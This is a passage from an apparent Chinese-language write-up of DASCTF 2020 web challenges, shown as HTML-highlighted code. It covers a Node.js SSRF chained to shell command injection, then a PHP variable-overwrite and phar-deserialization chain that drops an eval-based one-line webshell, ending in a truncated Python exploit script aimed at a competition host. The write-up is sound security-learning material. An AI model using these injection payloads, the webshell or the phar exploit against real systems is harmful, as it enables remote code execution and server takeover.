operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'res'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> u<span class="token operator">=</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\"\']</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> log<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">echo  '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'>>/tmp/log</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>child_process<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">data</span><span class="token operator">:</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/tmp/log'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> u <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url<span class="token punctuation">;</span><span class="token keyword">var</span> urlObject<span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>urlObject<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> dest<span class="token operator">=</span>urlObject<span class="token punctuation">.</span>href<span class="token punctuation">;</span><span class="token function">request</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>result<span class="token punctuation">,</span>body</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>有个debug路径，请求会判断是不是本地回环访问，即<code>127.0.0.1</code>等，不是则返回空json。如果是本地访问就会读取get中url参数，去除单双引号用nodejs的url.parse解析，解析后的url拼接到shell命令中执行，输出<code>/tmp/log</code>再返回内容。</p><p>由此，应先POST<code>/debug</code>， 在<code>url</code>参数中绕过blacklist，让程序再GET请求自己的<code>/debug</code>路径，之后构造注入命令。</p><p>考察一个SSRF，构造payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527@xx&quot;&#125;</code>最后闭合引号</p><p>然后考虑把flag文件复制到<code>/tmp/log</code>，利用<code>$IFS</code></p><p>最终payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527;%2527@xx;cp$IFS/tmp/flag$IFS/tmp/log%00&quot;&#125;</code></p><hr><h4 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h4><p>神奇的phar反序列化</p><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/uploads/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'template.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$template</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tp1'</span><span class="token operator">=></span><span class="token string single-quoted-string">'tp1.tpl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'tp2'</span><span class="token operator">=></span><span class="token string single-quoted-string">'tp2.tpl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'tp3'</span><span class="token operator">=></span><span class="token string single-quoted-string">'tp3.tpl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$tp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$tp</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No! You only have 3 template to reader"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">[</span><span class="token variable">$tp</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Please choice one template to reader"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>关键点<code>exract</code>，可见变量覆盖<code>template</code>再利用<code>tp</code>达到任意文件读取。不过不可能直接读flag的，先读了<code>template.php</code></p><p><code>./?var[template][1]=template.php&amp;tp=1</code></p><pre class="language-php" data-language="php"><code class="language-php">//template.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".html"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/uploads/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your html file is in "</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>注意到关键点有个全局变量，联想到之前的变量覆盖，这里肯定是可以利用的。</p><p>类<code>Template</code>大概意思就是传入的<code>content</code>，利用<code>pattern</code>进行正则匹配，利用全局变量中的值替换匹配到的值，最后输出以<code>suffix</code>后缀的文件。</p><p>摸索一番后确认为神奇的phar反序列化，考点为文件上传和命令执行。</p><p>利用脚本生成phar文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&#123;&#123;gyycoming&#125;&#125;"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/uploads/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your html file is in "</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>可以看到<code>content</code>为<code>gyycoming</code>，之后变量覆盖<code>gyycoming</code>为一句话木马，生成.php文件，即可成功getshell</p><p>还有更好的方法，直接<code>content</code>为一句话木马，<code>pattern</code>直接删掉，既然可以phar反序列化，就有很多姿势了。</p><p>首先用<code>php://input</code>伪协议上传phar文件。</p><p><code>./tp=1&amp;var[template][1]=php://input</code>，POST上传phar</p><p>然后触发phar文件，利用<code>phar://</code>伪协议</p><p><code>./?var[template][1]=phar://&quot;+&lt;url_path&gt;+&quot;&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?&gt;</code></p><img src="/article/dasctf2020/image-20201228193214814.png" class="" title="image-20201228193214814" loading="lazy"><p>可以看到第一个是正常的文件，第二个是触发phar反序列化写入的.php文件，蚁剑连上，到根目录执行<code>/readflag</code>即可。</p><img src="/article/dasctf2020/image-20201228193429000.png" class="" title="image-20201228193429000" loading="lazy"><p>所以直接读是不可以的，<code>400</code>没有权限，需要执行<code>/readflag</code>。</p><p>最后附上exp</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/25 14:24@Auth ： gyy@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> osbaseurl <span class="token operator">=</span> <span class="token string">"http://8.129.41.25:10305/"</span><span class="token keyword">def</span> <span class="token function">phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    php <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?phpclass Template&#123;    public $content;    public $pattern;    public $suffix;    public function __construct()&#123;        $this->content = "&#123;&#123;gyycoming&#125;&#125;";        $this->pattern = "/&#123;&#123;([a-z]+)&#125;&#125;/";        $this->suffix = ".php";    &#125;    public function __destruct() &#123;        $this->render();    &#125;    public function render() &#123;        while (True) &#123;            if(preg_match($this->pattern, $this->content, $matches)!==1)                break;            global $&#123;$matches[1]&#125;;            if(isset($&#123;$matches[1]&#125;)) &#123;                $this->content = preg_replace($this->pattern, $&#123;$matches[1]&#125;, $this->content);            &#125;            else&#123;                break;            &#125;        &#125;        if(strlen($this->suffix)>5) &#123;            echo "error suffix";            die();        &#125;        $filename = '/var/www/html/uploads/' . md5($_SERVER['REMOTE_ADDR']) . "/" . md5($this->content) . $this->suffix;        file_put_contents($filename, $this->content);        echo "Your html file is in " . $filename;    &#125;&#125;$phar = new Phar('phar.phar');$phar -> stopBuffering();$phar -> setStub('&lt;?php __HALT_COMPILER();?>');$phar -> addFromString('test.txt','test');$object = new Template();$phar -> setMetadata($object);$phar -> stopBuffering();?>'''</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar.php'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>php<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.php is create'</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'php phar.php'</span><span class="token punctuation">)</span>    a<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.phar is create'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] create phar file wrong."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">up_phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?tp=1&amp;var[template][1]=php://input"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        pharfile <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>pharfile<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file to ----> "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"/var/www/html/"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        upurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token 